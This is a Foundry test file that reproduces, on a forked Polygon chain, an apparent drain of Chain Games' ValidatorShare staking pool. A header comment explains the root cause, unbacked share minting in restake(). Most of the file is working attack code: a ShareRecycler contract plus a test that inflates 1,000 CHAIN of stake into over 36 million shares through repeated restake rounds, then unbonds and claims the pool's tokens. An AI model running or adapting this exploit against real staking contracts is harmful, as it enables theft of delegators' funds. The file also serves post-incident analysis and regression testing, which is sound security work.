// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

// Chain Games ($CHAIN) ValidatorShare staking drain (Polygon, 2026-11-15)
//
// @Incident
// Chain Games runs a fork of Polygon's ValidatorShare delegated-staking system for its CHAIN
// token. The attacker bought a 1,000 CHAIN voucher, inflated that stake into 36,007,148 shares by
// recycling it through throwaway contracts that each called restake(), sold the inflated balance
// into an unbond, waited out the withdrawal delay, and claimed, draining the StakeManager pool of
// nine delegators. Reported ~$20K.
//   Chain             : Polygon
//   Exploit tx        : https://polygonscan.com/tx/0x3705970a2eb947041640522d36d34822fc6a0eed3d0a9f05fff986da273019b4
//   Attacker EOA      : https://polygonscan.com/address/0x571d0ec17d84fdee89f5c9cf6b2fd930205e776f
//   Attacker contract : https://polygonscan.com/address/0xc11dce2b74ce1717909c4c8d95e32b4cec5691fe
//   CHAIN token       : https://polygonscan.com/address/0xd55fce7cdab84d84f2ef3f99816d765a2a94a509
//   StakeManager      : https://polygonscan.com/address/0x1cb1f66bde215161d4b6598ddc2defbbc009c5a4 (pool / transferFunds)
//   ValidatorShare    : https://polygonscan.com/address/0x4b197ce70af7faece9544ef29b76c1cccd54d7ac (validatorId 13)
//   USDC/CHAIN pool   : https://polygonscan.com/address/0xa4e9cff312f719bf663cd88d2118aaa16a0b574f (Uniswap V3, 0.3%)
//
// @Root cause
// ValidatorShare.restake() reinvests a delegator's accrued liquid rewards into new shares. The
// reward credited to an address is (rewardPerShare - initialRewardPerShare[address]) * balance.
// A freshly created contract that receives shares by ERC20 transfer keeps initialRewardPerShare 0
// while the validator already carries a large accrued rewardPerShare, so restake() mints it a
// phantom reward that is not backed by any new stake. Routing the whole balance through a new
// contract each round compounds the balance at a fixed rate (~2.96% per round here) with no cap,
// and the inflated shares are then sellable into an unbond that the StakeManager pays out in full.
// The claim path itself still enforces the real "shares > 0 and matured unbond" check, so the bug
// is the unbacked share minting in restake(), not a missing check in unstakeClaimTokens().
//
// @Reconstruction
// Typed interface calls against the live contracts, forked one block before the drain. The attacker
// stake is acquired honestly on the open market (USDC swapped to CHAIN through the real Uniswap V3
// pool); only the non-staked USDC seed uses deal(). No calldata replay, no mocks, no vm.store or
// vm.prank of any protocol identity.
//
// @Result
// 1,000 CHAIN of real stake inflated to >36,007,148 shares and 36,007,148.334503496028863428 CHAIN
// drained from the pool, matching the on-chain exploit transfer to the wei.
//
// @Run
//   POLYGON_RPC=<polygon archive rpc> forge test --contracts src/test/2026-11/ChainGames_exp.sol -vv

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IUniV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata) external payable returns (uint256);
}

interface IValidatorShare {
    function buyVoucher(uint256 _amount, uint256 _minSharesToMint) external returns (uint256);
    function sellVoucher(uint256 claimAmount, uint256 maximumSharesToBurn) external;
    function restake() external returns (uint256, uint256);
    function unstakeClaimTokens() external;
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function unbonds(address) external view returns (uint256 shares, uint256 withdrawEpoch);
}

// Throwaway share holder: receives shares with a fresh reward baseline, restakes the phantom
// reward, and ships the whole balance (original + minted) back to the attacker.
contract ShareRecycler {
    function go(IValidatorShare vs, address back) external {
        vs.restake();
        vs.transfer(back, vs.balanceOf(address(this)));
    }
}

contract ChainGamesExp is Test {
    IERC20 CHAIN = IERC20(0xd55fCe7CDaB84d84f2EF3F99816D765a2a94a509);
    IERC20 USDC = IERC20(0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359);
    IUniV3Router ROUTER = IUniV3Router(0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45);
    address STAKE_MANAGER = 0x1CB1f66BDe215161d4b6598DDc2dEfBBc009C5A4;
    IValidatorShare VS = IValidatorShare(0x4B197ce70aF7FaECE9544EF29B76c1cCcD54d7aC);

    uint256 constant INCIDENT_DRAIN = 36_007_148_334503496028863428; // on-chain transfer, wei

    function setUp() public {
        vm.createSelectFork("polygon", 97338783); // one block before the drain tx
    }

    function testExploit() public {
        emit log_named_decimal_uint("pool CHAIN before", CHAIN.balanceOf(STAKE_MANAGER), 18);

        // 1) acquire 1,000 CHAIN honestly: swap a non-staked USDC seed through the real V3 pool.
        deal(address(USDC), address(this), 2_000e6);
        USDC.approve(address(ROUTER), type(uint256).max);
        uint256 bought = ROUTER.exactInputSingle(
            IUniV3Router.ExactInputSingleParams(address(USDC), address(CHAIN), 3000, address(this), 2_000e6, 0, 0)
        );
        emit log_named_decimal_uint("CHAIN bought on DEX", bought, 18);
        assertGe(bought, 1_000e18, "DEX did not yield the stake");

        // 2) take a legitimate 1,000 CHAIN voucher (the StakeManager pulls the tokens).
        CHAIN.approve(STAKE_MANAGER, type(uint256).max);
        VS.buyVoucher(1_000e18, 0);
        assertEq(VS.balanceOf(address(this)), 1_000e18, "unexpected starting shares");

        // 3) inflate the stake: recycle the whole balance through a fresh ShareRecycler each round,
        //    each restake() minting an unbacked phantom reward, until it covers the incident drain.
        uint256 rounds;
        while (VS.balanceOf(address(this)) <= INCIDENT_DRAIN && rounds < 500) {
            ShareRecycler r = new ShareRecycler();
            VS.transfer(address(r), VS.balanceOf(address(this)));
            r.go(VS, address(this));
            rounds++;
        }
        uint256 inflated = VS.balanceOf(address(this));
        emit log_named_uint("recycle rounds", rounds);
        emit log_named_decimal_uint("inflated shares", inflated, 18);
        assertGt(inflated, INCIDENT_DRAIN, "inflation fell short of the drain");

        // 4) sell exactly the incident amount into a legacy unbond.
        VS.sellVoucher(INCIDENT_DRAIN, inflated);
        (uint256 unbondShares,) = VS.unbonds(address(this));
        assertEq(unbondShares, INCIDENT_DRAIN, "unbond did not record the drain");

        // 5) clear the withdrawal delay and claim, draining the pool.
        vm.warp(block.timestamp + 2 days);
        uint256 beforeBal = CHAIN.balanceOf(address(this));
        VS.unstakeClaimTokens();
        uint256 drained = CHAIN.balanceOf(address(this)) - beforeBal;

        emit log_named_decimal_uint("CHAIN drained", drained, 18);
        emit log_named_decimal_uint("pool CHAIN after", CHAIN.balanceOf(STAKE_MANAGER), 18);
        assertEq(drained, INCIDENT_DRAIN, "drain did not match the on-chain amount");
    }

    // Negative control: without the restake inflation there is no matured unbond, so a direct claim
    // by a fresh account reverts. The drain only exists because restake() mints unbacked shares.
    function testControl_noInflationNoClaim() public {
        vm.prank(address(0xBEEF));
        vm.expectRevert(bytes("Incomplete withdrawal period"));
        VS.unstakeClaimTokens();
    }
}
